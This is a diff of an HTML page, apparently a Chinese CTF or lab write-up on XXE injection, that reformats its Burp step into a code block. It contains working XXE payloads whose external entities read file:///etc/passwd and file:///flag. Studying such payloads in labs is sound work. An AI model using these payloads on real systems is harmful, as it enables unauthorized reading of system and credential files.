@@ -102,17 +102,9 @@
 <p>给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2022/png/971753/1668338064844-b136849a-2bda-4687-8e09-e3ff7ed122f0.png" alt="img"></p>
 <p>3.利用burp抓包</p>
-<p>改成post方法</p>
-<?xml version="1.0" encoding="utf-8"?>
+<p><strong>改成post方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE note [   </span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;   ]&gt;</span><br></pre></td></tr></table></figure>
 
-<!DOCTYPE note [
-
-  <!ENTITY admin SYSTEM "file:///etc/passwd">
-
-<p>  ]&gt;</p>
-<?xml version="1.0" encoding="utf-8"?><!DOCTYPE note [   
-
- <!ENTITY admin SYSTEM "file:///flag"><p>   ]&gt;</p>
 
       
     </div>
